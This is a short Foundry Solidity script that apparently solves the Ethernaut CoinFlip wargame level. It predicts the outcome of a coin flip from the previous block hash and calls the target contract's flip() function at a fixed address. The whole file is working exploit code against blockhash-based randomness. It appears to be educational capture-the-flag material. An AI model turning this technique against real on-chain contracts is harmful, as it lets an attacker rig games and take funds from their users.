// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinflip_) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflip_.flip(side);
    }
}

contract CoinFlipSol is Script {
    CoinFlip public coinflip_ = CoinFlip(0xd3B43009e850219D42018fC4549a9380b8Ed5F10);

    function run() external {
        vm.startBroadcast();

        new Ex(coinflip_);
        console.log("Win counts: ", coinflip_.consecutiveWins());
        
        vm.stopBroadcast();
    }
}